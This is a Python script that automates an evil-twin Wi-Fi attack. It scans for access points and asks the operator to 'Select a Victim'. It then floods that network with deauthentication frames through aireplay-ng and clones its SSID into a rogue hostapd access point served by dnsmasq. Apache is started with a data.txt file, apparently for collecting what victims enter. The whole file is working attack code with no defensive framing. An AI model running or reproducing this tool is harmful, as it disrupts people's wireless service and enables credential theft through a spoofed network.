#! /usr/bin/python

import os, sys, re
import subprocess, time
import linecache


class colours:
    bold = '\033[1m'
    underline = '\033[4m'
    red='\033[31m'
    green='\033[32m'
    orange='\033[33m'
    blue='\033[34m'
    purple='\033[35m'
    lightred='\033[91m'
    lightgreen='\033[92m'
    yellow='\033[93m'
    lightblue='\033[94m'
    pink='\033[95m'
    end = '\033[0m'

print(colours.bold+colours.lightblue+'startng Apache Web Server'+colours.end)
os.system('service apache2 start')
os.system('> /var/www/html/data.txt')
os.system('ifconfig wlan1 up')
print(colours.bold+colours.pink+'\nScanning...'+colours.end)

LIST = subprocess.Popen(['/bin/bash', '-c', 'iwlist wlan1 scan | grep -e ESSID -e Signal -e Address -e Channel:'],stdout=subprocess.PIPE)
file = open('data','w')
file.write('')
file.close()

for line in iter(LIST.stdout.readline,''):
   scan = line.rstrip().split('-', 1)[-1].split(':', 1)[-1].replace('dBm','').replace('""','Hidden').lstrip('\"').rstrip('\"').strip()
   file = open('data','a')
   file.write(scan+'\n')
   file.close()


count = len(open('data').readlines()); x=4

while x <= count:
	ESSID = linecache.getline('data', x).strip()
	subprocess.Popen(['touch','APs/'+str(ESSID)])

	line1=linecache.getline('data', x).rstrip("\n")
	line2=linecache.getline('data', x-1).rstrip("\n")
	line3=linecache.getline('data', x-2).rstrip("\n")
	line4=linecache.getline('data', x-3).rstrip("\n")

	file = open('APs/'+ESSID,'w')
	file.write(line1+'\n'+line2+'\n'+line3+'\n'+line4+'\n')
	file.close()
	x=x+4


########################################################################################################################################




count = len(open('data').readlines()); x=4; y=1

print('')
while x <= count:
	AP_file=linecache.getline('data', x)
	file=('APs/'+AP_file).strip()

	print('('+str(y)+') '+colours.bold+colours.lightblue+'['+linecache.getline(file, 1)).strip()+']'+colours.end
	print(colours.bold+colours.lightred+linecache.getline(file, 4)).strip()+colours.end
	strength = 100-int(linecache.getline(file, 2))
	print(colours.bold+colours.green+strength/2*'|'+' '+str(strength)+'%'+colours.end)
	#print(colours.bold+colours.purple+linecache.getline(file, 3)).strip()+colours.end
	print('')

	x=x+4
	y=y+1

option=raw_input(colours.bold+'\n\n Select a Victim: '+colours.end)
os.system('clear')

#########################################################################################################################################

subprocess.Popen(['python', 'monitor.py'],#######
        stdout=open('/dev/null','w'),############
        stderr=open('hostapd.log','a'),##########
        preexec_fn=os.setpgrp)###################


AP_file=str('APs/'+linecache.getline('data',int(option)*4)).strip()
CHANNEL=linecache.getline(AP_file, 3).strip()
MACADDRESS=linecache.getline(AP_file, 4).strip()
SSID=linecache.getline(AP_file, 1).strip()

subprocess.check_output(['airmon-ng', 'start', 'wlan2'])

subprocess.Popen(['airodump-ng', '-c', CHANNEL, 'wlan2mon'],
        stdout=open('/dev/null','w'),
        stderr=open('Error.log','a'),
        preexec_fn=os.setpgrp)

time.sleep(5)
os.system('killall airodump-ng')
os.system('clear')
subprocess.Popen(['aireplay-ng', '--deauth', '0', '-e', SSID, '-a', MACADDRESS, 'wlan2mon'],
	stdout=open('/dev/null','w'),
	stderr=open('Error.log','a'),
	preexec_fn=os.setpgrp)

os.system('clear')

print(colours.bold+colours.red+'\nLaunching Attack...'+colours.end)

time.sleep(2)

os.system('clear')

os.system("sed -i '11s/.*/ssid="+SSID+"/' hostapd.conf")

os.system('airmon-ng start wlan1')

os.system('ifconfig wlan1mon up 192.168.1.1 netmask 255.255.255.0')
os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')

os.system('killall dnsmasq')
#os.system('dnsmasq -C dnsmasq.conf -d')
subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'],
        stdout=open('/dev/null','w'),
        stderr=open('dnsmasq.log','a'),
        preexec_fn=os.setpgrp)

#subprocess.Popen(['hostapd', 'hostapd.conf'])
subprocess.Popen(['hostapd', 'hostapd.conf'],
        stdout=open('/dev/null','w'),
        stderr=open('hostapd.log','a'),
        preexec_fn=os.setpgrp)

print(colours.bold+colours.purple+'\nRunning Access Point...'+colours.end)
time.sleep(2)	
os.system('clear')

################################################################################################

'''
subprocess.Popen(['python', 'monitor.py'],
        stdout=open('/dev/null','w'),
        stderr=open('hostapd.log','a'),
        preexec_fn=os.setpgrp)
'''
print(colours.bold+colours.green+'Monitoring Connections...'+colours.end)
time.sleep(2)
os.system('clear')




